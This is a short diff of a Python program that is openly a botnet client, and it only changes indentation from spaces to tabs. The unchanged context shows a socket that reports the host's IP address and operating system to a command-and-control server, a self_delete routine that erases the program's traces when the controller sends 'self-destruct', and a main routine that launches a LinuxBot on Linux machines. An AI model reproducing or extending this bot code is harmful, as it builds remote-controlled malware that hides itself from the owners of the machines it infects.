@@ -39,11 +39,11 @@ def create_client_socket(ip_addr: str, port: int):
 		client_ip = socket.gethostbyname(host) # Get local IP using host name.
 		initial_message = "IP=" + client_ip + ",OS=" + system() # Send IP address and OS information.
 		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
-
-        return client_sock # Return the created client socket.
-
+		
+		return client_sock # Return the created client socket.
+		
 def self_delete(name: str):
-    """This function will be invoked when the C&C server enter's the
+	"""This function will be invoked when the C&C server enter's the
 		keyword "self-destruct" and which will instruct the program to
 		delete traces of itself.
 
@@ -176,7 +176,7 @@ class LinuxBot:
 
 def main():
 	obj = None
-    OS = system() # Determine operating system.
+	OS = system() # Determine operating system.
 	if OS == "Linux": # Check if operating system is Linux.
 		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
